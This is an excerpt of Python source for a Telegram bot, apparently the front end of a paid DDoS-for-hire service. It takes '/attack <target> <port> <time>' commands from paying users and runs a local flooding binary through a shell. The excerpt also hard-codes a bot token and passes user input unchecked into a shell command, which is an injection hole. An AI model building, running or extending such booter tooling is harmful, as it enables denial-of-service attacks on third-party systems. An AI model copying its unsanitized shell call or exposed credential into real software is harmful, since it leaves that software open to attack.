...
bot = telebot.TeleBot('7910026816:AAEFPLQCMI4C9-YhMvhBmqZ7DeYJkPCxvNs')
    ...
    if user_id in allowed_user_ids:
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 601:
                ...
                full_command = f"./om {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                response = f"Flooding Complete"
        else:
            response = "Usage :- /attack <target> <port> <time>"  # Updated command syntax
    else:
        response = " ❌ Access expired or unauthorized buy - https://t.me/+CKjXPRBmxIg0MmNl"
